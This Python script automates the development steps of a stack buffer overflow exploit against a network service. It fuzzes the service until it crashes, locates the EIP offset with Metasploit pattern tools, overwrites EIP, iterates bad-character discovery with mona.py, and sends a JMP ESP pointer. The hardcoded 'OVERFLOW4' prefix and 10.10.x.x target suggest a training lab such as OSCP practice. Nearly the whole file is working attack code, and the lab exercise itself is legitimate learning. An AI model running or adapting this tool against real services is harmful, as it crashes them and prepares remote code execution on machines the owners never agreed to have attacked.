import os
import sys, socket
from time import sleep

def fuzzing(prefix, ip, port):
    string = prefix + "A" * 100

    while True:

        try:

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                s.recv(1024)
                print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
                s.send(bytes(string, "latin-1"))
                s.recv(1024)

        except:

            print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            crash_bytes = len(string) - len(prefix)
            return crash_bytes

        string += 100 * "A"
        sleep(1)


def send_pattern(prefix, pattern, ip, port):
    try:
        payload = prefix + pattern
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("[+] sending pattern")
        s.send((payload.encode()))
        s.recv(1024)
        s.close()

    except:
        print("KINDLY check the DEBUGGER for EIP value if the server crashed")


def overwrite_EIP(prefix, ip, port ,offset):

    shellcode = 'A' * offset + 'B' * 4

    try:
        payload = prefix + shellcode
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect((ip, port))

        s.send((payload.encode()))

        s.close()
        print("[+] kindly check the DEBUGGER for the EIP value, it should be 42424242")
    except:
        print("ERROR connecting ...")




def convertStringToHex(string):
    return bytes(string, "utf-8").decode("unicode_escape")

def generate_chars(badchar):
    chars = ""
    for x in range(0, 256):
        c = "\\x" + "{:02x}".format(x)
        # print(c)
        #print(badchar)
        if str(c) not in badchar:
            chars += c
    chars = convertStringToHex(chars)
    return chars


def find_bad_char(ip, port, prefix, offset, badchar):
    print("\n\n")
    print("[*] FINDING BAD CHARACTER STARTS FROM HERE...")
    bc = str(input(r"KINDLY ENTER a bad character that u found in mona.py. For first time enter \x00  and use the same format aferwords OR type EXIT if no bad character was found \n"))
    if bc == "EXIT" or bc == "exit":
        print(f"These are the all the bad characters {badchar}")
        return badchar

    badchar.append(bc)

    chars = generate_chars(badchar)
    retn = 'B' * 4
    padding = ""
    postfix = ""
    shellcode = 'A' * offset + retn + padding + chars + postfix + "\r\n"

    try:
        payload = prefix + shellcode

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print("Trying to connect ...")
        try:
            s.connect((ip, port))

        except:
            print("Not able to connect, EXITING...")
            sys.exit()
        print("Connected to the server")

        s.send((bytes(payload, "latin-1")))

        s.close()
        print(f"current bad characters are {badchar}")
        print(r"[+] KINDLY do the following... ")
        print(r"1. Setup a working folder for the Mona.py by entering command :-  !mona config -set workingfolder c:\mona\%p")
        print(r"2. Generate new bytearray in mona.py by using :-  !mona bytearray -b 'BAD CHARACTERS HERE WITHIN QOUTES'")
        print(r"3. Now Find new bad characters using :- !mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address>")
        find_bad_char(ip, port, prefix, offset, badchar)

    except:
        print("Error connecting to server")


def Jump_pointer(ip, port, prefix, offset, pointer):
    n = 2

    out = [(pointer[i:i + n]) for i in range(0, len(pointer), n)]
    out.reverse()
    pointer = ""
    for i in out:
        pointer += f"\\x{i}"
    pointer = convertStringToHex(pointer)
    shellcode = 'A' * offset + pointer

    try:
        payload = prefix + shellcode
        #print(payload)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("trying to connect to the server...")
        s.connect((ip, port))
        print("Connected to the server...")
        s.send((bytes(payload, "latin-1")))
        s.close()
        print("Kindly note that vlaue of EIP should be the pointer value if you had put break point at the pointer value.")
        print("NOW use exploit.py to exploit")

    except:
        print("Error connecting to server")

if __name__ == "__main__":
    prefix = 'OVERFLOW4 /.:/'           #change accordingly
    ip = "10.10.247.84"                 #change accordingly
    port = 1337                          #change accordingly
    timeout = 5
    badchar = []
    pattern_create = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb"
    pattern_offset = "/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb"
    print("[*] Starting FUZZING...")
    crash_bytes = fuzzing(prefix, ip, port)
    input("[+] KINDLY restart the debugger and run the application. PRESS ENTER once done")
    pattern = os.popen(f"{pattern_create} -l {crash_bytes}").read()
    send_pattern(prefix, pattern, ip, port)
    input("[+] KINDLY note down the EIP value and restart the debugger and run the application. PRESS ENTER once done")
    EIPvalue = input("Kindly enter the value of  EIP \n")
    offset = os.popen(f"{pattern_offset} -l {crash_bytes} -q {EIPvalue}").read()
    print(offset)
    offset = int(str(offset).split(" ")[-1])
    print("[*] Overwriting EIP ...")
    overwrite_EIP(prefix, ip, port, offset)
    result = find_bad_char(ip, port, prefix, offset, badchar)
    print("[*] KINDLY find the JMP pointer using one of the following ...")
    print(r"1. while dubbger is running with the application, enter :  !mona jmp -r esp -cpb \"BAD CHARACTERS\"")
    print(r"                                                 OR")
    print(r"Enter commands:")
    print(r"1. !mona modules")
    print(r"2. !mona find -s \"\xff\xe4\" -m myapp.exe")
    print(r"copy the pointer value in a -→ arrow that says follow the expression. press enter . Than u will see jump statement")
    print(r"put a break point at the pointer value")
    pointer = input("[*] Kindly enter the pointer value \n")
    Jump_pointer(ip, port, prefix, offset, pointer)

